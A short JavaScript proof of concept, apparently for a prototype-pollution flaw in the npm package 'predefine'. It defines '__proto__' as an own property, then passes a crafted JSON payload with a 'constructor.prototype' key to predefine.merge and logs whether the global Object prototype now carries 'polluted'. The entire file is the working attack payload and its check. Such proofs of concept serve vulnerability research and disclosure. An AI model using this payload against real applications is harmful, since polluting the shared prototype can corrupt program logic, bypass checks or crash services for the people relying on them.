var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var predefine = require('predefine');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
predefine.merge(obj, payload);
console.log({}.polluted);